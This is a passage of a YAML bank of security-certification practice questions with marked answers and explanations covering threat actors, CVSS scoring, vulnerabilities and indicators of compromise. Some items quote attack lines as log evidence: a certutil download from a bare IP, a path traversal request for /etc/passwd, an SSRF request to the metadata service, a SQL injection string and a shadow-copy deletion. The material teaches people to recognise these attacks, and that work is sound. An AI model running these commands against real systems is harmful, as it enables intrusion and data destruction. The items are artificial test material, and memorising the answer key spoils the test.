@@ -1,0 +1,923 @@
+- key: sec-medium-01
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.1, likelihood, impact, risk]
+  prompt: |
+    A ferry operator's only remote access path is a VPN appliance at the internet edge. A
+    government advisory says a ransomware group is mass-exploiting a flaw in that exact model this
+    week. The vendor's patch is scheduled for next month's maintenance window. Which of the
+    following BEST describes the change in risk?
+  options:
+    - text: "Likelihood has risen sharply and impact is high, so the risk should be treated as critical now"
+      correct: true
+    - text: "Impact has risen, but likelihood is unchanged until exploitation is seen on the company's own network"
+    - text: "Risk is unchanged, because the vulnerability's CVSS base score has not changed"
+    - text: "Likelihood has fallen, because the advisory means defenders are now aware of the flaw"
+  explanation: |
+    Risk combines likelihood and impact. Active exploitation of an exposed asset makes the
+    event much more likely, and the VPN guards every internal system, so impact is high: act
+    before the scheduled window. Waiting for exploitation on your own network confuses detection
+    with likelihood. The CVSS base score describes severity, which does not change with threat
+    activity, so it cannot be the measure of risk here. Awareness does not lower likelihood
+    until a control actually changes.
+
+- key: sec-medium-02
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.1, tlp, intelligence-sharing]
+  prompt: |
+    A partner sends an incident report marked **TLP:AMBER+STRICT**. The security manager wants to
+    forward it to the managed security service provider that runs the company's security
+    operations center. Which of the following is correct?
+  options:
+    - text: "It may be shared only within the company's own organization, so it should not go to the provider"
+      correct: true
+    - text: "It may be shared with the company's clients and providers on a need-to-know basis"
+    - text: "It may be shared with the wider security community but not through public channels"
+    - text: "It may be shared freely, subject only to copyright"
+  explanation: |
+    TLP:AMBER+STRICT restricts sharing to the recipient's own organization. Plain TLP:AMBER also
+    allows the recipient's clients on a need-to-know basis, which is the tempting answer.
+    TLP:GREEN allows the community but not public channels, and TLP:CLEAR allows anyone. Ask the
+    partner for permission or a different label before forwarding.
+
+- key: sec-medium-03
+  type: multiple
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.1, threat-feeds, stix, taxii]
+  prompt: |
+    A company joins CISA's Automated Indicator Sharing (AIS) to feed machine-readable indicators
+    into its SIEM. Which two statements about the standards involved are correct? (Choose two.)
+  options:
+    - text: "STIX 2.1 describes indicators, malware and threat actors as JSON objects"
+      correct: true
+    - text: "TAXII 2.1 is the protocol that carries STIX data between servers and clients"
+      correct: true
+    - text: "TLP is the file format in which the indicators are delivered"
+    - text: "TAXII assigns each indicator a severity score from 0.0 to 10.0"
+    - text: "STIX patterns are SQL statements that the SIEM runs against its database"
+  explanation: |
+    STIX (Structured Threat Information Expression) is the JSON format for threat intelligence,
+    and TAXII (Trusted Automated Exchange of Intelligence Information) is the transport; AIS uses
+    TAXII 2.1. TLP is a sharing label, not a format. Scores from 0.0 to 10.0 belong to CVSS. A
+    STIX pattern is its own matching language, such as `[url:value = '...']`, which tools
+    translate for their own searches.
+
+- key: sec-medium-04
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.1, life-cycle, threat-intelligence]
+  prompt: |
+    A threat intelligence team has gathered indicators from five feeds, removed duplicates and
+    converted them all to one format. In the threat intelligence life cycle, which phase comes
+    next?
+  options:
+    - text: "Analysis"
+      correct: true
+    - text: "Dissemination"
+    - text: "Direction"
+    - text: "Feedback"
+  explanation: |
+    Gathering is collection, and deduplicating and normalizing is processing. Next comes
+    analysis: turning the data into judgments with context and confidence. Dissemination follows
+    analysis, since there is nothing useful to deliver yet. Direction sets the questions at the
+    start, and feedback evaluates the finished product.
+
+- key: sec-medium-05
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.2, unskilled-attacker, motivation]
+  prompt: |
+    A city's parking payment website is taken offline for an afternoon by a flood of traffic. The
+    traffic is traced to a rented "booter" service, and a teenager boasts about the outage on
+    social media. Which actor and motivation BEST fit?
+  options:
+    - text: "An unskilled attacker motivated by notoriety"
+      correct: true
+    - text: "A hacktivist motivated by political ideology"
+    - text: "A state-sponsored actor motivated by espionage"
+    - text: "A crime syndicate motivated by extortion"
+  explanation: |
+    Renting an attack service rather than building one shows little capability, and public
+    boasting shows a desire for notoriety. A hacktivist would tie the attack to a cause. A state
+    actor seeking espionage would avoid attention and take data, not cause an outage. A crime
+    syndicate would demand payment.
+
+- key: sec-medium-06
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.2, state-sponsored, apt, living-off-the-land]
+  prompt: |
+    Investigators at a power utility find that intruders used valid administrator accounts and
+    built-in Windows tools for more than four years. They copied the Active Directory database
+    several times, stole no customer data and never demanded money. Analysts assess the goal was
+    to be able to disrupt operations during a future crisis. Which of the following BEST
+    describes this actor?
+  options:
+    - text: "A state-sponsored advanced persistent threat pre-positioning for disruption"
+      correct: true
+    - text: "A crime syndicate preparing a ransomware attack"
+    - text: "A malicious insider motivated by revenge"
+    - text: "A hacktivist seeking publicity for a cause"
+  explanation: |
+    Years of quiet access, living-off-the-land tools, no financial demand and a disruptive
+    objective against critical infrastructure match a state-sponsored APT, as in CISA's advisory
+    on Volt Typhoon. Ransomware crews move toward payment within days or weeks. An insider
+    already has access and would not need to steal the directory repeatedly over years. A
+    hacktivist wants attention, which is the opposite of four silent years.
+
+- key: sec-medium-07
+  type: multiple
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.2, insider, attributes]
+  prompt: |
+    Two weeks after being dismissed, a database administrator uses a VPN account that was never
+    disabled to delete the company's backups. Which two attributes or motivations BEST describe
+    this actor? (Choose two.)
+  options:
+    - text: "Internal"
+      correct: true
+    - text: "Motivated by revenge"
+      correct: true
+    - text: "Very high resources and funding"
+    - text: "External, with no prior knowledge of the systems"
+    - text: "Motivated by espionage"
+  explanation: |
+    The actor's access and knowledge come from employment, which makes this an internal (insider)
+    threat even though the login came over a VPN, and destroying backups after a dismissal points
+    to revenge. A single former employee has no special funding. They are not an outsider without
+    knowledge. Nothing was taken, so espionage does not fit. The control lesson is offboarding:
+    disable every account, including VPN and service accounts, on the last day.
+
+- key: sec-medium-08
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.2, accidental-insider]
+  prompt: |
+    To send a crew roster to a contractor quickly, an employee shares a cloud folder of passenger
+    manifests with "anyone with the link". Months later the link turns up in search results.
+    Which threat actor type does this incident represent?
+  options:
+    - text: "An unintentional (accidental) insider"
+      correct: true
+    - text: "A malicious insider motivated by financial gain"
+    - text: "A competitor seeking intellectual property"
+    - text: "An unskilled attacker seeking notoriety"
+  explanation: |
+    The employee had legitimate access and no harmful intent; the exposure came from a mistake,
+    which is the definition of an accidental or unintentional insider. A malicious insider acts on
+    purpose, and nothing suggests payment. No competitor or outside attacker was involved in
+    creating the exposure. Better sharing defaults, data loss prevention and training address it.
+
+- key: sec-medium-09
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.1, cvss, scoring]
+  prompt: |
+    A vendor publishes this vector for a flaw in its document viewer:
+
+    ```text
+    CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
+    ```
+
+    Which of the following BEST describes how the vulnerability is exploited?
+  options:
+    - text: "A user must open a crafted file on the local system, after which the attacker gains full impact on that component"
+      correct: true
+    - text: "An attacker sends packets to a listening network service, with no user involvement"
+    - text: "An attacker who already holds administrator rights can affect components beyond the viewer"
+    - text: "An attacker must have physical access to the device to exploit it"
+  explanation: |
+    AV:L means the attack runs locally (a file opened on the machine), UI:R means a user must take
+    an action such as opening it, PR:N means no privileges are needed, S:U means the impact stays
+    within the vulnerable component, and C, I and A are all High. A network service would be AV:N
+    with UI:N. Administrator rights would be PR:H and a wider impact S:C. Physical access is AV:P.
+
+- key: sec-medium-10
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.1, cvss-v4, threat-metrics]
+  prompt: |
+    An analyst scores a vulnerability with CVSS v4.0 base metrics and gets 7.7. Threat
+    intelligence shows no public proof of concept and no known exploitation, so the analyst adds
+    `E:U` to the vector and the score becomes 5.2. What is the new score called?
+  options:
+    - text: "CVSS-BT"
+      correct: true
+    - text: "CVSS-BE"
+    - text: "CVSS-B"
+    - text: "CVSS-BTE"
+  explanation: |
+    CVSS v4.0 names a score by the metric groups it includes: Base (B), Threat (T) and
+    Environmental (E). Exploit Maturity (E) is a Threat metric, so Base plus Threat is CVSS-BT.
+    CVSS-BE would add Environmental metrics such as security requirements, and CVSS-BTE would add
+    both. The letter E in the vector is Exploit Maturity, not the Environmental group, which is
+    the trap.
+
+- key: sec-medium-11
+  type: multiple
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.1, prioritization, kev, exposure]
+  prompt: |
+    A vulnerability scan returns 400 findings and the team can fix about 40 this week. Which two
+    factors should MOST raise a finding's priority beyond its CVSS base score? (Choose two.)
+  options:
+    - text: "The CVE is listed in CISA's Known Exploited Vulnerabilities catalog"
+      correct: true
+    - text: "The affected system is reachable from the internet"
+      correct: true
+    - text: "The CVE identifier was assigned in the current year"
+    - text: "The vendor published a CVSS v3.1 vector rather than a v4.0 vector"
+    - text: "The finding has a CWE identifier"
+  explanation: |
+    Evidence of exploitation in the wild (KEV) and exposure to the internet are the strongest
+    drivers of urgency; CISA's BOD 26-04 uses both. The year in a CVE ID only records when the
+    ID was assigned, and old vulnerabilities are exploited constantly. The CVSS version changes
+    how severity is expressed, not how urgent the fix is. Almost every finding has a CWE type.
+
+- key: sec-medium-12
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.3, image-based, qr-code, quishing]
+  prompt: |
+    Staff receive an email with a PDF attachment that contains only a QR code and the text "Scan
+    to keep your mailbox active". The email gateway found no malicious link. Why is this vector
+    effective?
+  options:
+    - text: "The link is inside an image that filters do not read, and it is opened on a personal phone outside corporate protections"
+      correct: true
+    - text: "The QR code exploits a memory corruption flaw in the PDF reader when displayed"
+    - text: "QR codes can carry macros that run when the image is scanned"
+    - text: "QR codes bypass multifactor authentication by design"
+  explanation: |
+    A QR code hides the URL in an image, so text-based link scanning misses it, and scanning moves
+    the victim to a phone without the company's web filtering. That is quishing. Displaying a QR
+    code does not exploit the reader. QR codes hold data such as a URL, not macros. They do not
+    affect MFA, although the phishing page behind one may try to capture MFA codes.
+
+- key: sec-medium-13
+  type: multiple
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.3, external-media, malicious-usb]
+  prompt: |
+    The FBI has warned that criminals mail USB devices that register as keyboards and type
+    commands when plugged in. Which two controls MOST directly reduce this risk? (Choose two.)
+  options:
+    - text: "An endpoint policy that blocks unknown USB devices, including new keyboards"
+      correct: true
+    - text: "Training staff to hand unexpected or found USB devices to IT instead of plugging them in"
+      correct: true
+    - text: "Blocking macros in Office files that come from the internet"
+    - text: "Publishing a DMARC policy of p=reject for the company's domains"
+    - text: "Enabling full-disk encryption on laptops"
+  explanation: |
+    A "BadUSB" device acts as a keyboard, so device control that blocks unapproved USB devices,
+    together with staff who do not plug in unexpected devices, addresses it. It carries no Office
+    file, so macro blocking does not apply. DMARC protects email domains from spoofing. Full-disk
+    encryption protects data on a lost device, not a running, unlocked machine receiving
+    keystrokes.
+
+- key: sec-medium-14
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.3, watering-hole, human-based]
+  prompt: |
+    Engineers at three ferry operators were infected after visiting a maritime trade
+    association's website. Attackers had modified the site to serve an exploit only to visitors
+    from those companies' address ranges. Which threat vector is this?
+  options:
+    - text: "Watering hole"
+      correct: true
+    - text: "Spear phishing"
+    - text: "Typosquatting"
+    - text: "Supply chain compromise through a managed service provider"
+  explanation: |
+    A watering hole compromises a site the targets already trust and visit, and serves them
+    malicious code there (ATT&CK T1189, Drive-by Compromise). Spear phishing sends targeted
+    messages; no message was sent. Typosquatting registers a misspelled domain; this was the
+    real site. The association is not a service provider with access to the victims' systems.
+
+- key: sec-medium-15
+  type: multiple
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.3, remote-access, ports]
+  prompt: |
+    An external scan of a company's public address range finds these open ports. Which two
+    findings are remote access exposures that should be removed from the internet? (Choose two.)
+
+    ```text
+    198.51.100.2   443/tcp  https          VPN gateway
+    198.51.100.5   3389/tcp ms-wbt-server  file server
+    198.51.100.9   5900/tcp vnc            building management PC
+    198.51.100.14  25/tcp   smtp           mail relay
+    ```
+  options:
+    - text: "TCP 3389 on the file server"
+      correct: true
+    - text: "TCP 5900 on the building management PC"
+      correct: true
+    - text: "TCP 443 on the VPN gateway"
+    - text: "TCP 25 on the mail relay"
+    - text: "None, because the firewall logs every connection"
+  explanation: |
+    RDP (3389) and VNC (5900) give full remote control and are heavily attacked; put them behind
+    the VPN or an access broker with MFA. The VPN on 443 is the intended, hardened entry point.
+    A mail relay must receive mail on port 25. Logging connections does not prevent them.
+
+- key: sec-medium-16
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.3, living-off-the-land, endpoint]
+  prompt: |
+    EDR records this process on a workstation; antivirus found no malicious file:
+
+    ```text
+    Image:        C:\Windows\System32\certutil.exe
+    CommandLine:  certutil.exe -urlcache -f http://198.51.100.40/upd.txt C:\Users\Public\upd.txt
+    ParentImage:  C:\Windows\System32\cmd.exe  (running a .cmd file from the user's Downloads)
+    ```
+
+    Which of the following BEST describes this activity?
+  options:
+    - text: "Living off the land: a signed built-in tool used to download a file"
+      correct: true
+    - text: "A false positive, because certutil.exe is signed by Microsoft"
+    - text: "A rootkit hiding files from antivirus"
+    - text: "A watering hole attack against the user's browser"
+  explanation: |
+    Attackers abuse built-in, signed tools such as certutil to download payloads because they are
+    trusted and present everywhere; the LOLBAS project documents this use. A signature proves who
+    made the tool, not that this use is legitimate, and certutil fetching a file from a bare IP
+    address, started by a script from Downloads, is not normal. Nothing suggests a rootkit, and no
+    browser exploit was involved.
+
+- key: sec-medium-17
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.3, browser-based, session-tokens, extensions]
+  prompt: |
+    Several users' SaaS accounts are used from another country. Their logs show no failed
+    logins and no MFA prompts. All of them recently received an automatic update to a browser
+    extension that requests the `cookies` permission for all sites. What is the MOST likely
+    explanation?
+  options:
+    - text: "The updated extension stole session cookies, which the attacker replayed"
+      correct: true
+    - text: "A password spraying attack guessed the users' passwords"
+    - text: "An MFA fatigue attack wore the users down until they approved"
+    - text: "SIM swapping redirected the users' SMS codes"
+  explanation: |
+    A session cookie represents an already authenticated session, so replaying it needs neither
+    the password nor MFA, which explains the absence of failures and prompts. An extension with
+    access to all cookies can take them, and a trusted extension can turn malicious through an
+    update. Spraying would leave failed logins. MFA fatigue and SIM swapping both involve MFA
+    challenges, which never happened.
+
+- key: sec-medium-18
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.4, stale-credentials]
+  prompt: |
+    Attackers sign in to a company's cloud data warehouse with a contractor's password that
+    infostealer malware captured three years earlier. The password was never changed, the account
+    is still active although the contract ended, and MFA was not required. Which vulnerability
+    does the old, still-valid password represent?
+  options:
+    - text: "Unmanaged (stale) credentials"
+      correct: true
+    - text: "A zero-day vulnerability in the data warehouse"
+    - text: "Misconfigured public object storage"
+    - text: "Shadow IT"
+  explanation: |
+    A credential that outlived its need and was never rotated or disabled is a stale, unmanaged
+    credential; the missing MFA made it usable alone. This mirrors the 2024 Snowflake customer
+    thefts. Nothing in the product was flawed, so it is not a zero-day. No storage was public. The
+    warehouse was an approved service, not shadow IT.
+
+- key: sec-medium-19
+  type: multiple
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.4, unsupported, unmanaged, inventory]
+  prompt: |
+    An inventory review in October 2026 finds a dispatch PC still running Windows 10 22H2, and a
+    network storage device that nobody recognizes, with no endpoint agent and no recorded owner.
+    Which two vulnerability categories do these findings represent? (Choose two.)
+  options:
+    - text: "Unsupported product"
+      correct: true
+    - text: "Unmanaged system"
+      correct: true
+    - text: "Zero-day vulnerability"
+    - text: "Race condition"
+    - text: "Public object storage"
+  explanation: |
+    Windows 10 reached end of support on 14 October 2025, so the PC no longer receives security
+    fixes: an unsupported product. A device with no agent and no owner is unmanaged; nobody
+    patches or monitors it. A zero-day is an unpatched flaw being exploited before a fix exists,
+    which is not what an inventory shows. Race conditions are code flaws, and nothing here is
+    cloud storage.
+
+- key: sec-medium-20
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.4, public-object-storage, misconfiguration]
+  prompt: |
+    A cloud review finds this bucket policy on a bucket of crew documents. Block Public Access was
+    switched off for the whole account last year to share a single file.
+
+    ```json
+    {"Effect": "Allow", "Principal": "*", "Action": "s3:GetObject",
+     "Resource": "arn:aws:s3:::ferry-crew-docs/*"}
+    ```
+
+    Which of the following BEST describes the finding?
+  options:
+    - text: "Misconfigured public object storage: anyone on the internet can read every object"
+      correct: true
+    - text: "A secret leaked through a public code repository"
+    - text: "A compromised identity provider issuing forged tokens"
+    - text: "A rogue device attached to the cloud network"
+  explanation: |
+    `"Principal": "*"` with `s3:GetObject` grants read access to everyone, and turning off Block
+    Public Access removed the safety net that would have refused such a policy. Restore Block
+    Public Access and share single files with time-limited links. No repository, identity
+    provider or hardware device is involved.
+
+- key: sec-medium-21
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.4, public-repositories, hardcoded-secrets]
+  prompt: |
+    A developer pushes a commit containing an AWS access key to a public repository and removes
+    the key in another commit ten minutes later. What should be done FIRST?
+  options:
+    - text: "Revoke the key and issue a new one"
+      correct: true
+    - text: "Rewrite the repository history to remove the commit"
+    - text: "Make the repository private"
+    - text: "Enable push protection for the repository"
+  explanation: |
+    The key was public and remains in the history, forks and clones, and automated scanners watch
+    public repositories, so it must be treated as stolen: revoke it, then review its activity.
+    Rewriting history and making the repository private do not invalidate copies already taken.
+    Push protection prevents the next leak but does nothing about this one.
+
+- key: sec-medium-22
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.4, virtualization, vm-escape]
+  prompt: |
+    A hypervisor vendor warns that an attacker with administrator rights inside a guest virtual
+    machine can run code on the host. Which vulnerability type does the advisory describe?
+  options:
+    - text: "Virtual machine escape"
+      correct: true
+    - text: "Privilege escalation within the guest operating system"
+    - text: "VM sprawl"
+    - text: "Resource reuse"
+  explanation: |
+    Breaking out of a guest to run code on the host is VM escape, the most serious virtualization
+    flaw because the host controls every guest. Privilege escalation inside the guest would stay
+    within that VM, and the attacker is already its administrator. VM sprawl is unmanaged growth
+    of virtual machines. Resource reuse is data left in memory or storage handed to another
+    tenant.
+
+- key: sec-medium-23
+  type: multiple
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.4, race-condition, exception-handling, code-review]
+  prompt: |
+    A code review of a file service finds two problems. First, it checks that an uploaded path is
+    not a symbolic link, then opens the path in a later step. Second, its permission check wraps
+    the lookup in `try` and returns `True` from `except Exception:`. Which two vulnerabilities did
+    the review find? (Choose two.)
+  options:
+    - text: "A time-of-check/time-of-use race condition"
+      correct: true
+    - text: "Unsafe exception handling that fails open"
+      correct: true
+    - text: "A hardcoded secret"
+    - text: "A buffer overflow"
+    - text: "SQL injection"
+  explanation: |
+    Checking a path and using it later leaves a window in which another process can swap the
+    file for a link: a TOCTOU race, fixed by opening with `O_NOFOLLOW` so the check is part of the
+    use. Returning `True` on any exception grants access whenever something goes wrong, which is
+    failing open; it should fail closed. No secret, memory error or database query appears in the
+    findings.
+
+- key: sec-medium-24
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.4, malicious-update, supply-chain]
+  prompt: |
+    The release archives of a widely used open-source compression library contained a backdoor
+    that one of its co-maintainers had added. Linux distributions that pulled the new version
+    shipped it to their users until a developer noticed unusual SSH behavior. Which of the
+    following BEST describes this?
+  options:
+    - text: "A malicious update delivered through a trusted software supply chain"
+      correct: true
+    - text: "A zero-day vulnerability accidentally introduced by a coding mistake"
+    - text: "Typosquatting of a popular package name"
+    - text: "A watering hole on the project's website"
+  explanation: |
+    The backdoor arrived through the project's normal release channel, from someone the project
+    trusted, so users installed it as a routine update (this was the xz utils case,
+    CVE-2024-3094). It was deliberate, not a mistake. No lookalike package name was used, and
+    nobody was infected by visiting a website. Verifying releases, reproducible builds and staged
+    rollouts are the defenses.
+
+- key: sec-medium-25
+  type: multiple
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.5, application-attacks, directory-traversal, forgery]
+  prompt: |
+    A web server logged these requests. Which two statements are correct? (Choose two.)
+
+    ```text
+    "GET /download?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 1184
+    "GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/ HTTP/1.1" 200 54
+    ```
+  options:
+    - text: "The first request is a directory traversal attempt that appears to have succeeded"
+      correct: true
+    - text: "The second request is server-side request forgery aimed at the cloud metadata service"
+      correct: true
+    - text: "The first request is SQL injection that failed"
+    - text: "The second request is cross-site request forgery against a logged-in user"
+    - text: "Both requests are replay attacks using captured session tokens"
+  explanation: |
+    `%2F` decodes to `/`, so the first request climbs out of the download folder with `../`, and
+    a 200 with a file-sized body suggests it returned the file. The second asks the server to
+    fetch an internal address, the metadata service at 169.254.169.254, which is SSRF; the 200
+    means the instance's credentials should be treated as exposed. There is no SQL in either.
+    CSRF abuses a victim's browser, not the server's own requests. No tokens are being replayed.
+
+- key: sec-medium-26
+  type: multiple
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.5, injection, sql-injection]
+  prompt: |
+    A booking application builds its queries by inserting form fields into SQL strings, and a log
+    shows the input `AB12' OR '1'='1`. Which two controls MOST effectively prevent this attack?
+    (Choose two.)
+  options:
+    - text: "Parameterized queries (prepared statements) for every database call"
+      correct: true
+    - text: "Allow-list validation of input formats as an additional layer"
+      correct: true
+    - text: "Replacing single quotes with two single quotes in the application code"
+    - text: "Hiding database error messages from users"
+    - text: "Encrypting traffic between the browser and the server with TLS"
+  explanation: |
+    Placeholders send values separately from the query, so input can never become SQL; validating
+    input against expected formats, such as a booking reference pattern, adds a second layer.
+    Hand-written escaping misses cases and is discouraged by OWASP. Hiding errors makes the
+    attacker's job slower but does not stop the injection. TLS protects data in transit and has
+    no effect on what the server does with the input.
+
+- key: sec-medium-27
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.5, malware, ransomware]
+  prompt: |
+    Early on Saturday, a file server runs `vssadmin.exe delete shadows /all /quiet`. Within an
+    hour, files on the shares have a new `.lock` extension and each folder holds a text file with
+    payment instructions and a threat to publish stolen data. Which malware type is this?
+  options:
+    - text: "Ransomware"
+      correct: true
+    - text: "Worm"
+    - text: "Logic bomb"
+    - text: "Rootkit"
+  explanation: |
+    Deleting shadow copies to block recovery (ATT&CK T1490), encrypting files and leaving a
+    payment note with a leak threat is ransomware with double extortion. A worm describes how
+    malware spreads, not this effect. A logic bomb waits for a condition and has no ransom. A
+    rootkit hides activity rather than announcing itself.
+
+- key: sec-medium-28
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.5, indicators, log-manipulation]
+  prompt: |
+    A domain controller records event ID 1102, "The audit log was cleared", at 02:13 on a Sunday.
+    The subject is the backup service account and there is no change ticket. Which indicator of
+    compromise does this represent?
+  options:
+    - text: "Log manipulation"
+      correct: true
+    - text: "Account lockout"
+    - text: "Excessive resource consumption"
+    - text: "Impossible travel"
+  explanation: |
+    Clearing the Security log destroys evidence, which is log manipulation; event 1102 should
+    almost never appear. Investigate the backup account and use the copies already forwarded to
+    the SIEM. Lockout, resource use and travel are other indicators with different evidence:
+    event 4740, performance data and sign-in locations respectively.
+
+- key: sec-medium-29
+  type: multiple
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.5, indicators, hash, domain, file-system]
+  prompt: |
+    On a workstation, an analyst finds `C:\Users\Public\svchost.exe`. Its SHA-256 matches an entry
+    in a threat feed, and it connects to `telemetry-sync.example.net`. Which three types of
+    indicator of compromise does the analyst have? (Choose three.)
+  options:
+    - text: "Hash"
+      correct: true
+    - text: "Domain"
+      correct: true
+    - text: "File system artifact"
+      correct: true
+    - text: "Impossible travel"
+    - text: "Account lockout"
+    - text: "Concurrent sessions"
+  explanation: |
+    The matching SHA-256 is a hash indicator, the contacted name is a domain indicator, and a
+    system binary's name in an unusual folder is a file system artifact (the real `svchost.exe`
+    lives in `C:\Windows\System32`). Impossible travel, lockouts and concurrent sessions are
+    account indicators found in authentication logs, which this evidence does not involve.
+
+- key: sec-medium-30
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.5, network-attacks, spoofing, on-path]
+  prompt: |
+    A monitoring host logs:
+
+    ```text
+    arpwatch: changed ethernet address 10.40.0.1 0:c:29:5e:a1:07 (0:50:56:9a:10:01) eth0
+    arpwatch: flip flop 10.40.0.1 0:50:56:9a:10:01 (0:c:29:5e:a1:07) eth0
+    ```
+
+    10.40.0.1 is the default gateway. Which attack is MOST likely under way?
+  options:
+    - text: "ARP spoofing to gain an on-path position"
+      correct: true
+    - text: "DNS cache poisoning"
+    - text: "A rogue DHCP server"
+    - text: "A DNS amplification DDoS"
+  explanation: |
+    Two MAC addresses answering for the gateway's IP means forged ARP replies are poisoning hosts'
+    caches so their traffic flows through the attacker (ATT&CK T1557.002). DNS poisoning changes
+    name resolution, not MAC mappings. A rogue DHCP server would hand out a different gateway
+    address rather than claim the real one. Amplification floods a target with traffic.
+    Dynamic ARP inspection on the switches prevents this.
+
+- key: sec-medium-31
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.5, dns-attacks, tunneling]
+  prompt: |
+    A resolver's query log shows one workstation sending hundreds of TXT queries a minute, each for
+    a name like `mzxw6ytboi4dsnzrgq3tqojqgu2dmnzz.d1.example.org` with a different random-looking
+    first label. Which of the following BEST describes this?
+  options:
+    - text: "DNS tunneling to move data or commands through DNS"
+      correct: true
+    - text: "DNS cache poisoning of the resolver"
+    - text: "A DNS amplification DDoS against the workstation"
+    - text: "Domain hijacking through a stolen registrar account"
+  explanation: |
+    Long encoded labels, many unique names under one domain, and TXT records are the signature of
+    data hidden in DNS queries. Cache poisoning inserts forged answers and does not need the
+    client to send unusual queries. In amplification the victim receives large responses it never
+    asked for. Domain hijacking changes a domain's records at the registrar and would not show
+    this query pattern. Block the domain and investigate the host.
+
+- key: sec-medium-32
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.5, rogue, dhcp]
+  prompt: |
+    An access switch logs repeated messages like this for a port in a meeting room:
+
+    ```text
+    %DHCP_SNOOPING-5-DHCP_SNOOPING_UNTRUSTED_PORT: DHCP_SNOOPING drop message on untrusted port, message type: DHCPOFFER
+    ```
+
+    Which of the following BEST describes the situation?
+  options:
+    - text: "A rogue DHCP server is connected to that port, and DHCP snooping is blocking its offers"
+      correct: true
+    - text: "Clients in the meeting room have already received the attacker's gateway address"
+    - text: "The legitimate DHCP server is failing and the port should be marked trusted"
+    - text: "An attacker is poisoning the cache of the company's DNS resolver"
+  explanation: |
+    DHCP offers should come only from the real servers' ports; an offer from an access port means
+    someone plugged in a DHCP server, possibly to make themselves everyone's gateway. The switch
+    dropped the offers, so clients did not receive them. Trusting the port would let the attack
+    work. DNS cache poisoning is a different attack on name resolution.
+
+- key: sec-medium-33
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.5, credential-attacks, password-spraying]
+  prompt: |
+    Over four hours, one source IP fails to log in to 230 different accounts, never more than
+    twice per account, at a steady pace. Then a login succeeds for `j.ortiz`. Which of the
+    following BEST describes the activity?
+  options:
+    - text: "Password spraying that has likely compromised j.ortiz"
+      correct: true
+    - text: "A brute force attack against j.ortiz"
+    - text: "User enumeration with no account compromised"
+    - text: "An MFA fatigue attack against j.ortiz"
+  explanation: |
+    A few attempts each across many accounts, slowly, is password spraying, designed to stay under
+    per-account lockout; the final success means one guess worked. Reset the password, end its
+    sessions and review its activity. Brute force would concentrate many attempts on one account.
+    The success rules out "no account compromised". Nothing mentions MFA prompts.
+
+- key: sec-medium-34
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.5, mfa-bypass, mfa-fatigue]
+  prompt: |
+    A user reports about thirty push notifications to approve a sign-in overnight; at 3 a.m. they
+    approved one to make them stop. A sign-in from another country followed. Which statement is
+    MOST accurate?
+  options:
+    - text: "This was MFA fatigue, and the attacker already had the user's password"
+      correct: true
+    - text: "This was a SIM swap that redirected the user's SMS codes"
+    - text: "This was pass-the-hash using the user's NTLM hash"
+    - text: "This was a password spraying attack that MFA stopped"
+  explanation: |
+    Each push is triggered by a sign-in with the correct password, so the attacker had it and
+    relied on fatigue to win the approval (ATT&CK T1621). Reset the password and revoke sessions;
+    number matching and limits on prompts prevent repeats. A SIM swap captures SMS codes rather
+    than push approvals. Pass-the-hash targets Windows authentication, not cloud MFA. MFA did not
+    stop this attack, because the user approved it.
+
+- key: sec-medium-35
+  type: multiple
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.5, impossible-travel, concurrent-sessions]
+  prompt: |
+    A sign-in log shows a successful login for `m.okafor` from London at 08:00 UTC and another
+    from Singapore at 09:30 UTC the same day. Both sessions are still active at 10:00. Which two
+    indicators does this show? (Choose two.)
+  options:
+    - text: "Impossible travel"
+      correct: true
+    - text: "Concurrent sessions"
+      correct: true
+    - text: "Account lockout"
+    - text: "Log manipulation"
+    - text: "Excessive resource consumption"
+  explanation: |
+    About 10,800 km in an hour and a half is far beyond any flight, so the logins cannot both be
+    the user traveling: impossible travel. Two active sessions from different countries at once
+    are concurrent sessions, typical of a stolen password or session token. There were no failed
+    logins, no cleared logs and no resource problem.
+
+- key: sec-medium-36
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.5, social-engineering, bec, impersonation]
+  prompt: |
